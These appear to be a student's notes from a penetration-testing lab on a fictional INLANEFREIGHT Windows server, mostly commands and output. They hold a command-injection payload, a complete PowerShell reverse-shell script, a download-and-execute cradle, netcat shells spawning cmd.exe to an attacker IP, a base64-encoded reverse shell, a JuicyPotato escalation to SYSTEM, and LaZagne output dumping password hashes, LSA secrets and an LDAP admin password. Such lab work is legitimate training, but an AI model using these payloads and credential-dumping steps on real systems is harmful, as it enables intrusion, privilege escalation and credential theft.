
---

During a penetration test against the INLANEFREIGHT organization, you encounter a non-domain joined Windows server host that suffers from an unpatched command injection vulnerability. After gaining a foothold, you come across credentials that may be useful for lateral movement later in the assessment and uncover another flaw that can be leveraged to escalate privileges on the target host.

For this assessment, assume that your client has a relatively mature patch/vulnerability management program but is understaffed and unaware of many of the best practices around configuration management, which could leave a host open to privilege escalation.

Enumerate the host (starting with an Nmap port scan to identify accessible ports/services), leverage the command injection flaw to gain reverse shell access, escalate privileges to `NT AUTHORITY\SYSTEM` level or similar access, and answer the questions below to complete this portion of the assessment.

---
Realized I could get command injection via 127.0.0.1 & timeout /t 5 sent to repeater and got a response

Created basic powershell one liner

shell.ps1 -

$LHOST = "10.10.15.224"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

$python3 -m http.server 8000
$nc -lvnp 4444

On website - 127.0.0.1 & powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.224:8000/shell.ps1')"

Got a shell

└──╼ [★]$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.107] from (UNKNOWN) [10.129.221.42] 49675
whoami
iis apppool\defaultapppool
wmic qfe get HotFixID,InstalledOn,Description

Description      HotFixID   InstalledOn    Update           KB3199986  11/21/2016     Security Update  KB3200970  11/21/2016   

Uploaded nc.exe to web server for more **stable shell**

wget http://10.10.15.224:8000/nc.exe -outfile "C:\Users\Public\nc.exe"

cd C:\Users\Public

ls
Documents Downloads Music Pictures Videos nc.exe

listening on [any] 4445 ...
connect to [10.10.15.107] from (UNKNOWN) [10.129.221.42] 49701
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

127.0.0.1 & C:\Users\Public\nc.exe 10.10.15.224 4445 -e cmd.exe

C:\Users\Public>whoami
whoami
iis apppool\defaultapppool

Trying these:

**Utilizing JuicyPotato for Priv ESC to SYSTEM**

$

$unzip JuicyPotatoNG.zip


$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 rev.ps1

Delete first two lines and last line so it looks like this and edit IP/port

$client = New-Object System.Net.Sockets.TCPClient('10.10.15.17',4446);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0

nano shell.bat

powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADcAJwAsADQANAA0ADYAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKAA==

Enumerated over CLSID

.\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe 10.10.15.107 4444" -t * -c “{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}”

## NEXT TO TRY

try LaZagne.exe. Upload it target server and execute with (all) parameter.

wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe

curl http://10.10.15.224:8000/LaZange.exe -O C:\Users\Public\laz.exe

wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe

curl http://10.10.15.224:8000/RoguePotato.exe -O C:\Users\Public\rp.exe

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

curl http://10.10.15.224:8000/PrintSpoofer64.exe -O C:\Users\Public\ps64.exe

git clone https://github.com/zcgonvh/EfsPotato

iwr http://10.10.15.224:8000/EfsPotato.cs -OutFile C:\Users\Public\EfsPotato.cs

iwr http://10.10.15.224:8000/LocalPotato.exe  -OutFile C:\Users\Public\lp.exe

wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

curl http://10.10.15.224:8000/JuicyPotato.exe -O C:\Users\Public\jp.exe

┌─[us-academy-4]─[10.10.15.224]─[htb-ac-1631704@htb-3y9qb7rsds]─[~]
└──╼ [★]$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.15.224] from (UNKNOWN) [10.129.89.7] 49726
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system



**.\jp.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\nc.exe 10.10.15.224 9999 -e cmd.exe" -t * -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"**
Testing {7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381} 53375
......
[+] authresult 0
{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK


PS C:\Users\Public> .\laz.exe all
.\laz.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
[+] System masterkey decrypted for 644d306e-3a7a-434b-bd62-0b81ab91e5b6
[+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6

########## User: SYSTEM ##########

------------------- Hashdump passwords -----------------

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mrb3n:1000:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::

------------------- Lsa_secrets passwords -----------------

DPAPI_SYSTEM
0000   01 00 00 00 1D 35 B6 2C 53 EC 28 92 E8 6D D5 BE    .....5.,S.(..m..
0010   C7 4C 78 54 10 66 34 3A 70 3F 77 AF 3F 11 FA 7F    .LxT.f4:p?w.?...
0020   03 8D 79 6A CC 1A FF AC 7C 0E DD D3                ..yj....|...

NL$KM
0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
0010   99 4F 5D 6C 55 B9 EC B5 0C 0B D8 75 A2 88 93 E4    .O]lU......u....
0020   C0 D9 EF C5 0D B9 40 57 92 39 9A BE 9D A5 83 ED    ......@W.9......
0030   11 CB 71 7C AB 32 CD 11 FD 7A ED 2E AB BE F1 62    ..q|.2...z.....b
0040   58 F2 1D 8A AC 9F AC FB 32 17 D8 EE B3 BD A5 DC    X.......2.......
0050   E2 D9 82 77 4A A3 16 D6 F3 B5 E0 28 13 72 C7 2E    ...wJ......(.r..



########## User: Administrator ##########

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
Host: dc01.inlanefreight.local
Port: 389
Login: ldapadmin
Password: car3ful_st0rinG_cr3d$
AuthenticationMethod: SIMPLE


########## User: htb-student ##########

------------------- Apachedirectorystudio passwords -----------------

[+] Password found !!!
Host: DC01.INLANEFREIGHT.LOCAL
Port: 389
Login: ldapadmin
Password: car3ful_st0rinG_cr3d$
AuthenticationMethod: SIMPLE


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 12.187516689300537


PS C:\Users\Administrator> Get-ChildItem -Path C:\Users\Administrator\ -Filter "*confidential*" -Recurse -File -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\Administrator\ -Filter "*confidential*" -Recurse -File -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Music


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----         6/7/2021  12:41 PM             32 confidential.txt 

PS C:\Users\Administrator\Music> cat confidential.txt
cat confidential.txt
5e5a7dafa79d923de3340e146318c31a
